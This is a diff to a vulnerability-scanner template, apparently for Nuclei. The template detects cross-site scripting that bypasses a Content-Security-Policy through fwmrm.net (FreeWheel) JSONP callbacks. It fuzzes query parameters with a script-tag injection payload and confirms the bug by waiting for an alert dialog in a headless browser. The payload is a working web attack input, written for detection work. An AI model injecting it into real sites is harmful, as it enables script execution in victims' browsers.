@@ -1,11 +1,11 @@
 id: fwmrm-csp-xss
 
 info:
-  name: Content-Security-Policy Bypass via FreeWheel
-  author: DhiyaneshDK
-  severity: high
+  name: Content-Security-Policy Bypass via Fwmrm
+  author: renniepak,DhiyaneshDK
+  severity: medium
   reference:
-    - https://github.com/renniepak/CSPBypass/blob/0b4c8aee52497d660adce7a6d67311a73383818c/data.tsv#L2C19-L2C113
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
   metadata:
     verified: true
   tags: xss,csp-bypass,fwmrm
@@ -18,7 +18,7 @@ http:
 
     payloads:
       injection:
-        - '<script src="https://7b936.v.fwmrm.net/ad/g/1?nw=1&csid=1&resp=json&cbfn=alert(1)-"></script>'
+        - '<script src="https://fwmrm.net/p/1?callback=alert"></script>'
 
     fuzzing:
       - part: query
@@ -33,15 +33,23 @@ http:
         part: body
         words:
           - "{{injection}}"
+        internal: true
 
-      - type: word
-        part: content_type
-        words:
-          - "text/html"
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{RootURL}}{{trim_prefix(http_matched, RootURL)}}"
 
-      - type: word
-        part: content_security_policy
-        words:
-          - "fwmrm.net"
-          - "script-src"
-        condition: and
+      - action: waitload
+
+      - action: waitdialog
+        name: fwmrm_csp_xss
+        args:
+          type: alert
+          timeout: 5000
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "fwmrm_csp_xss == true" 
